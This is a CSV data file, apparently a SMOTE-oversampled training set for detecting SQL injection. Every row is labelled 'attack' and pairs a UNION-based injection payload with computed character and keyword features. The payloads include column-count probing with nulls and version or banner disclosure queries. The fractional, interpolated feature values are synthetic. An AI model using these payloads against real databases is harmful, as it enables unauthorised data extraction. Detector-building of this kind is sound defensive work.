id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000099,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000087,1.3896520762974303,58.2145491388982,15.556103632935844,3.165230888174194,43.32675640476988,1.0,4.0,9.887792734128313,0.7426685506322559,0.017420003164656667,0.0696800126586268,0.17023143354446052,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.5561036329358431,0.0,6.33168910119247,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000100,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000068,0.47640903720517525,68.80179575772796,21.0,3.8833962605637837,14.0,35.04143660618237,8.0,11.760359151545593,0.2044666378239607,0.5079048031086275,0.11683807875654899,0.17079048031086277,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.760359151545592,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000101,attack,union,"1' where 4245  =  4245 union all select null,null--",nearest_attack_euclidean,R000284,1.3512103263960444,55.850698910188875,22.485069891018888,3.915487592083751,28.94027956407555,9.0,11.94027956407555,5.970139782037775,0.5191209859185965,0.1624377080708133,0.2122942040070602,0.1061471020035301,1.0,0.0,2.0,0.0,0.0,1.0,0.0,0.4850698910188872,0.0,0.0,1.4850698910188873,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.4850698910188873,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000102,attack,union,"1'+  (  select 'pgje' where 4658  =  4658 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000168,0.9588090107805595,109.26474105241152,27.73525894758848,3.8654988480558465,69.0,9.0,15.0,16.26474105241152,0.63150399227553,0.08237008594898218,0.13728347658163698,0.14884244519385081,3.0,0.0,0.5294821048230389,0.0,0.0,1.0,0.0,1.0,0.0,0.0,9.0,2.529482104823039,1.0,0.0,0.26474105241151935,0.7352589475884805,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000103,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000002,0.21575566913291228,77.0,27.42511410858275,3.957424368548973,40.0,3.0,23.0,11.0,0.5194805194805194,0.038961038961038974,0.2987012987012987,0.14285714285714285,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,5.287442945708625,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000104,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000197,0.2724165011486484,78.90271244664876,25.805424893297534,4.011744217972097,43.05424893297534,10.84846351367343,16.0,9.0,0.5453852005202624,0.1377643955794161,0.20278425849620574,0.11406614540411572,0.0,1.0,2.097287553351233,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.902712446648767,3.097287553351233,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000105,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000002,0.3425994497566799,76.62805177785634,27.25610355571268,3.9443247086244333,40.0,3.0,23.0,10.62805177785634,0.5220228860023489,0.039151716450176205,0.30016315945135064,0.13866223809612413,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,4.62805177785634,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000106,attack,union,-5970' where 2769  =  2769 union all select 2769--,nearest_attack_euclidean,R000237,1.8898269044858498,50.0,23.0,4.103449765931428,19.0,16.0,10.0,5.0,0.38,0.32,0.2,0.1,0.5106828630023652,0.48931713699763474,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,4.0,0.5106828630023652,0.48931713699763474,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000107,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000076,0.7442045630700327,70.40599423935335,24.80046109533487,4.005489633218772,36.6101440973672,11.194927951316402,14.800461095334873,7.800461095334873,0.512761359656237,0.1651999525780633,0.21103738501578664,0.11100130274991299,1.0,0.0,2.1995389046651272,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.8004610953348723,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8004610953348728,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8004610953348728
SMOTE_000108,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000213,0.2657482765662101,81.20781994339859,17.0,3.178163019842317,47.766255954718865,1.0,18.0,14.441563988679718,0.5876794912567851,0.012344215624605526,0.22219588124289935,0.17778041187571006,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,7.441563988679717,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000109,attack,union,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",nearest_attack_euclidean,R000095,0.14653064083386932,59.61833420269423,19.0,3.773621209008925,14.0,32.49466736215538,4.0,9.123666840538846,0.24174602814619367,0.5375328837269897,0.06907029375605533,0.15165079437076126,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.123666840538846,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000110,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000091,0.48549310959402014,57.879963206738786,22.710774891270955,3.891988738511678,14.0,22.313800869832352,13.132324673812867,8.433837663093566,0.24318853910601887,0.3809455446624834,0.23061353437866913,0.14525238185282852,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8553874456354778,0.0,0.0,3.5784502174580886,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000111,attack,union,-2797'   )    )     )   union all select 5711#,nearest_attack_euclidean,R000285,0.06277155133393764,46.119973261772486,20.047989304708995,3.4615297285049933,14.0,8.191957218835984,17.90402139058201,6.023994652354498,0.30363187311815226,0.1772677945320867,0.3885019033481959,0.1305984290015652,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.9760053476455015,0.0,0.0,0.047989304708996094,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000112,attack,union,"1%"" union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000212,0.613650146637868,46.661321914669244,15.826452876586771,3.3071911430731675,34.52905753173539,1.0,4.0,7.1322643829338475,0.7359364263658175,0.022879847726493763,0.09151939090597515,0.14966433500171367,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.132264382933848,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000113,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000240,1.4994540517879111,34.743037403514926,16.10801662378441,3.5982347635578074,15.891983376215592,6.797045715407124,8.0,4.054008311892204,0.47297848548991384,0.17792165304162288,0.23423564168536806,0.11486421978309519,0.0,0.0,2.527004155946102,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.5270041559461025,2.527004155946102,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000114,attack,union,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",nearest_attack_euclidean,R000089,0.11814565423260623,79.0,22.0,3.5731693916259375,14.0,44.0,8.0,13.0,0.17721518987341772,0.5569620253164557,0.10126582278481013,0.16455696202531644,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,9.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000115,attack,union,"1"" union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000204,0.9400244000794233,47.303305230426886,15.269669476957311,3.2344928681109395,34.763966276512264,1.0,5.078677907829245,6.460661046085377,0.7303363575346957,0.021348347384786526,0.11236033723487737,0.13595495784564035,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.26966947695731125,0.0,0.0,4.190991569128066,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.2696694769573114,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000116,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R000276,1.3581279177205707,81.88882805357294,26.0,3.8549287994117925,21.47613833163394,36.0,14.825379443877981,9.58731027806101,0.2612197814514565,0.4403889005109471,0.18085978559263166,0.11753153244496475,0.0,0.5873102780610095,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.0,2.0,0.0,0.5873102780610095,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000117,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000097,0.04095663392907115,65.92959456651852,21.023468477827162,3.8043896000075796,14.0,28.0,13.929594566518514,10.0,0.212370120219379,0.424740240438758,0.2111966963280209,0.15169294301384215,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.988265761086419,0.011734238913581274,0.0,5.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000118,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,1.3062835465537206,98.6148233020673,25.38517669793271,4.030454878226689,62.38517669793271,4.61482330206729,23.614823302067293,8.0,0.6326544473682918,0.0467731797973949,0.23944668600855978,0.08112568682575362,0.0,0.0,2.0,0.0,1.6148233020672902,2.0,0.0,0.0,0.0,0.0,1.0,5.61482330206729,0.0,0.0,1.0,0.3851766979327099,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,1.9999999999999998,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000119,attack,union,"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",nearest_attack_euclidean,R000219,1.1180373363896956,85.8202914219131,24.0,3.9158549908095965,21.460874265739278,38.35941715617382,14.820291421913092,11.179708578086908,0.24970774517531977,0.44729395556433404,0.17258156740443942,0.13041673185590671,0.5898542890434539,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.589854289043454,4.0,0.5898542890434539,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000120,attack,union,"1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000133,0.4235919259715696,110.91122155971453,27.088778440285463,3.921367118553028,66.15908991086519,11.752131648849346,15.177556880570926,17.822443119429074,0.5962968626114442,0.10616589836075727,0.13685835301782595,0.16067888600997263,3.0,0.0,2.088778440285463,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.733664679143612,5.088778440285463,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.08877844028546276,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.088778440285463
SMOTE_000121,attack,union," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000012,1.6701826690515016,76.44643218625765,30.145829116032743,4.178726710039702,40.0,3.0,20.854170883967257,12.592261302290392,0.524010593336097,0.039300794500207265,0.27148190305083436,0.1652067091128614,3.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,0.8154773954192167,0.0,0.0,1.0,4.592261302290392,1.0,0.0,1.0,0.0,0.0,1.0,0.40773869770960836,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000122,attack,union,"-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--",nearest_attack_euclidean,R000141,0.018816729000780272,73.055034367763,21.0,3.6337020931256045,14.0,32.04891943801155,14.0,13.006114929751444,0.1916521080606946,0.43865853979392366,0.1916521080606946,0.17803724408468702,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.0,0.9938850702485558,0.0,6.012229859502888,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000123,attack,union," select * from users where id  =  1 union select !<@,version  (    )   -- 1",nearest_attack_euclidean,R000041,0.29817803941548887,75.37851084699352,27.0,3.9187567146176336,40.0,2.0,23.0,10.378510846993526,0.5306771168632033,0.026533855843160176,0.30513934219634187,0.1376496850972946,0.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,5.621489153006474,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000124,attack,union,"-6659'  )   where 1256  =  1256 union all select 1256,1256--",nearest_attack_euclidean,R000160,0.8821192873055831,63.074722497546496,24.236517115195884,3.98378910324845,24.20337653430945,17.398311732845276,14.236517115195884,7.236517115195884,0.3746079599555214,0.2836539392739239,0.2267454136863247,0.11499268708423005,1.0,0.0,2.763482884804116,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.2365171151958845,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.2365171151958843,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.236517115195884
SMOTE_000125,attack,union,"1'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000225,0.028188323190447704,62.23658379236962,16.0,3.192007501353372,38.14195027542178,1.0,14.047316758473924,9.047316758473926,0.6128659978296822,0.016082497287102787,0.2257319956593644,0.14531950922385067,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.011829189618481,0.0,0.0,5.0354875688554435,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000126,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000028,1.2251850977377794,91.41869364603716,26.562765779109597,4.106603986834282,58.75820717098824,3.5534954916829715,21.437234220890403,7.669756762475542,0.6409175824578348,0.03823228638446444,0.23378891259557766,0.08706121856212307,0.0,0.0,2.0,0.0,1.0000000000000002,1.776747745841486,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.776747745841486,1.7767477458414858,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.553495491682972
SMOTE_000127,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000018,0.20551674963334035,80.14519649981554,26.290392999631077,3.8940304565049106,40.0,3.1451964998155386,24.85480350018446,12.145196499815539,0.49910372530978064,0.0392253287786723,0.3101472789381741,0.15152366697337294,3.0,0.0,2.0,0.0,1.0000000000000002,1.0,0.0,2.0,0.0,0.0,1.0,4.290392999631076,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000128,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,0.11462004366655992,102.85717680228122,27.07141159885939,4.125302230798901,61.55367750712881,5.410616693441501,23.875029701996063,12.017852899714848,0.5981485765450005,0.05293895098753898,0.23204453919783807,0.11686793326962236,3.0,0.0,2.017852899714848,0.0,0.9821471002851521,1.982147100285152,0.0,0.017852899714847714,0.0,0.0,1.0357057994296959,6.982147100285152,1.0,0.0,1.0,0.0,0.0,1.0,0.017852899714847936,0.0,0.0,0.0,1.0,2.0,1.0,1.982147100285152,1.982147100285152,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.964294200570304
SMOTE_000129,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000070,0.7907776616808284,56.952431973419344,16.976215986709676,3.3599780667947843,39.62702664451612,1.0,8.976215986709674,7.349189342193551,0.6954676752484208,0.017599871244882465,0.15680251072479204,0.13012994278190476,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.349189342193551,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000130,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000080,0.7110558044605658,55.376656892166196,19.92466862156676,3.8922934135147464,14.0,28.301325513732955,4.0,9.075331378433239,0.25490893450322444,0.5086755034248864,0.0728311241437784,0.16358443792811078,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.07533137843324,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000091,1.4814565689426198,47.97402234683902,23.0,4.016667756349382,14.0,15.413727055336588,11.706863527668293,6.853431763834147,0.3073284118082926,0.3080042184500349,0.24181022688452963,0.14285714285714285,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.6178105879447156,0.3821894120552844,0.0,1.853431763834147,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
